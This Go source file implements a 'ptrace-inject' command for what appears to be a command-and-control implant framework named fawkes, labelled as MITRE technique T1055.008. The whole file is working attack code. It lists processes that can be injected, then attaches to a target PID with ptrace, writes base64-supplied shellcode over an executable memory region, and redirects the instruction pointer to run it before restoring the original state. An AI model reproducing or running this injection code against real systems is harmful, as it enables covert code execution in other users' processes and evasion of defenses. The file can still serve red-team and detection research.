//go:build linux && amd64

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/structs"
)

type PtraceInjectCommand struct{}

func (c *PtraceInjectCommand) Name() string { return "ptrace-inject" }
func (c *PtraceInjectCommand) Description() string {
	return "Linux process injection via ptrace syscall (T1055.008)"
}

type ptraceInjectArgs struct {
	Action       string `json:"action"`        // check, inject
	PID          int    `json:"pid"`           // Target process ID
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode
	Restore      *bool  `json:"restore"`       // Restore original code after execution (default: true)
	Timeout      int    `json:"timeout"`       // Timeout in seconds waiting for shellcode (default: 30)
}

func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: check, inject",
			Status:    "error",
			Completed: true,
		}
	}

	var args ptraceInjectArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	action := strings.ToLower(args.Action)
	if action == "" {
		action = "inject"
	}

	switch action {
	case "check":
		return ptraceCheck()
	case "inject":
		return ptraceInject(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: check, inject", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func ptraceCheck() structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Ptrace Configuration\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// Check ptrace_scope (Yama LSM)
	if scope, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope"); err == nil {
		val := strings.TrimSpace(string(scope))
		sb.WriteString(fmt.Sprintf("ptrace_scope: %s", val))
		switch val {
		case "0":
			sb.WriteString(" (classic — any process can ptrace same-UID processes)\n")
		case "1":
			sb.WriteString(" (restricted — only parent can ptrace child, or CAP_SYS_PTRACE)\n")
		case "2":
			sb.WriteString(" (admin-only — requires CAP_SYS_PTRACE)\n")
		case "3":
			sb.WriteString(" (disabled — no ptrace allowed)\n")
		default:
			sb.WriteString("\n")
		}
	} else {
		sb.WriteString("ptrace_scope: not available (Yama LSM not loaded)\n")
	}

	sb.WriteString(fmt.Sprintf("\nCurrent UID:  %d\n", os.Getuid()))
	sb.WriteString(fmt.Sprintf("Current EUID: %d\n", os.Geteuid()))

	if os.Geteuid() == 0 {
		sb.WriteString("\nRunning as root — ptrace should work on all processes\n")
	}

	// Show capabilities from /proc/self/status
	if status, err := os.ReadFile("/proc/self/status"); err == nil {
		sb.WriteString("\nCapabilities:\n")
		for _, line := range strings.Split(string(status), "\n") {
			if strings.HasPrefix(line, "Cap") {
				sb.WriteString(fmt.Sprintf("  %s\n", line))
			}
		}
	}

	// List candidate processes (same UID)
	sb.WriteString("\nCandidate Processes (same UID):\n")
	entries, _ := os.ReadDir("/proc")
	uid := os.Getuid()
	count := 0
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		var pid int
		if _, err := fmt.Sscanf(e.Name(), "%d", &pid); err != nil {
			continue
		}
		if pid == os.Getpid() {
			continue
		}
		statusPath := fmt.Sprintf("/proc/%d/status", pid)
		data, err := os.ReadFile(statusPath)
		if err != nil {
			continue
		}
		var procUID int
		var procName string
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "Name:") {
				procName = strings.TrimSpace(strings.TrimPrefix(line, "Name:"))
			}
			if strings.HasPrefix(line, "Uid:") {
				fmt.Sscanf(strings.TrimPrefix(line, "Uid:"), "%d", &procUID)
			}
		}
		if procUID == uid || os.Geteuid() == 0 {
			sb.WriteString(fmt.Sprintf("  PID %-7d %s\n", pid, procName))
			count++
			if count >= 20 {
				sb.WriteString("  ... (truncated)\n")
				break
			}
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
	if args.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: valid pid required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: shellcode_b64 required (base64-encoded shellcode)",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: shellcode is empty",
			Status:    "error",
			Completed: true,
		}
	}

	restore := true
	if args.Restore != nil {
		restore = *args.Restore
	}

	timeout := args.Timeout
	if timeout <= 0 {
		timeout = 30
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", args.PID))
	sb.WriteString(fmt.Sprintf("[*] Restore: %v\n", restore))

	// Verify target process exists
	if _, err := os.Stat(fmt.Sprintf("/proc/%d", args.PID)); err != nil {
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Process %d not found\n", args.PID),
			Status:    "error",
			Completed: true,
		}
	}

	// Lock the OS thread — ptrace requires all operations from the same thread
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Step 1: Attach to the process
	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
	if err := syscall.PtraceAttach(args.PID); err != nil {
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Wait for the process to stop (SIGSTOP)
	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString("[+] Process stopped\n")

	// Step 2: Save original registers
	var origRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(args.PID, &origRegs); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_GETREGS failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Saved registers (RIP=0x%X, RSP=0x%X)\n", origRegs.Rip, origRegs.Rsp))

	// Step 3: Find an executable memory region in the target
	execAddr, regionSize, err := findExecutableRegion(args.PID)
	if err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Append INT3 (0xCC) if we plan to wait for completion
	injectionCode := make([]byte, len(shellcode))
	copy(injectionCode, shellcode)
	if restore {
		injectionCode = append(injectionCode, 0xCC)
	}

	if uint64(len(injectionCode)) > regionSize {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Shellcode (%d bytes) exceeds region size (%d bytes)\n", len(injectionCode), regionSize),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Using executable region at 0x%X (%d bytes available)\n", execAddr, regionSize))

	// Step 4: Backup original code at injection point
	origCode := make([]byte, len(injectionCode))
	if _, err := syscall.PtracePeekText(args.PID, uintptr(execAddr), origCode); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Failed to read original code: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Backed up %d bytes of original code\n", len(origCode)))

	// Step 5: Write shellcode using PTRACE_POKETEXT
	if _, err := syscall.PtracePokeText(args.PID, uintptr(execAddr), injectionCode); err != nil {
		// Attempt to restore original code before detaching
		_, _ = syscall.PtracePokeText(args.PID, uintptr(execAddr), origCode)
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Failed to write shellcode: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), execAddr))

	// Step 6: Set RIP to the shellcode
	newRegs := origRegs
	newRegs.Rip = execAddr
	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
		_, _ = syscall.PtracePokeText(args.PID, uintptr(execAddr), origCode)
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_SETREGS failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", execAddr))

	// Step 7: Continue execution
	sb.WriteString("[*] Continuing execution...\n")
	if err := syscall.PtraceCont(args.PID, 0); err != nil {
		_, _ = syscall.PtracePokeText(args.PID, uintptr(execAddr), origCode)
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_CONT failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	if restore {
		// Step 8: Wait for INT3 (SIGTRAP) with timeout using WNOHANG polling
		// Wait4 must be called from the same OS thread as PtraceAttach
		deadline := time.Now().Add(time.Duration(timeout) * time.Second)
		stopped := false
		for time.Now().Before(deadline) {
			wpid, err := syscall.Wait4(args.PID, &ws, syscall.WNOHANG, nil)
			if err != nil {
				sb.WriteString(fmt.Sprintf("[!] Wait4 error: %v\n", err))
				break
			}
			if wpid > 0 {
				stopped = true
				break
			}
			time.Sleep(50 * time.Millisecond)
		}

		if !stopped {
			sb.WriteString(fmt.Sprintf("[!] Timeout after %ds waiting for shellcode completion\n", timeout))
			sb.WriteString("[*] Detaching without restore (shellcode may still be running)\n")
			_ = syscall.PtraceDetach(args.PID)
			return structs.CommandResult{
				Output:    sb.String(),
				Status:    "success",
				Completed: true,
			}
		}

		if ws.StopSignal() == syscall.SIGTRAP {
			sb.WriteString("[+] Shellcode completed (SIGTRAP received)\n")
		} else {
			sb.WriteString(fmt.Sprintf("[*] Process stopped with signal %d\n", ws.StopSignal()))
		}

		// Step 9: Restore original code
		if _, err := syscall.PtracePokeText(args.PID, uintptr(execAddr), origCode); err != nil {
			sb.WriteString(fmt.Sprintf("[!] Failed to restore code: %v\n", err))
		} else {
			sb.WriteString("[+] Restored original code\n")
		}

		// Step 10: Restore original registers
		if err := syscall.PtraceSetRegs(args.PID, &origRegs); err != nil {
			sb.WriteString(fmt.Sprintf("[!] Failed to restore registers: %v\n", err))
		} else {
			sb.WriteString("[+] Restored original registers\n")
		}
	}

	// Step 11: Detach
	if err := syscall.PtraceDetach(args.PID); err != nil {
		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
	} else {
		sb.WriteString("[+] Detached from process\n")
	}

	sb.WriteString("[+] Ptrace injection completed successfully\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// findExecutableRegion finds an r-xp memory region in the target process.
// Returns the start address and size of the region.
func findExecutableRegion(pid int) (uint64, uint64, error) {
	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
	data, err := os.ReadFile(mapsPath)
	if err != nil {
		return 0, 0, fmt.Errorf("cannot read %s: %v", mapsPath, err)
	}

	for _, line := range strings.Split(string(data), "\n") {
		if line == "" {
			continue
		}
		// Format: start-end perms offset dev inode pathname
		// e.g.: 7f1234560000-7f1234561000 r-xp 00000000 08:01 12345 /lib/x86_64-linux-gnu/libc.so.6
		parts := strings.Fields(line)
		if len(parts) < 2 {
			continue
		}

		perms := parts[1]
		// Look for r-xp (readable + executable + private)
		if len(perms) >= 4 && perms[0] == 'r' && perms[2] == 'x' {
			// Skip vdso and vsyscall — they have special protections
			if len(parts) >= 6 {
				name := parts[len(parts)-1]
				if strings.Contains(name, "vdso") || strings.Contains(name, "vsyscall") {
					continue
				}
			}

			addrParts := strings.Split(parts[0], "-")
			if len(addrParts) != 2 {
				continue
			}
			var startAddr, endAddr uint64
			if _, err := fmt.Sscanf(addrParts[0], "%x", &startAddr); err != nil {
				continue
			}
			if _, err := fmt.Sscanf(addrParts[1], "%x", &endAddr); err != nil {
				continue
			}
			if endAddr > startAddr {
				return startAddr, endAddr - startAddr, nil
			}
		}
	}

	return 0, 0, fmt.Errorf("no executable region found in process %d", pid)
}
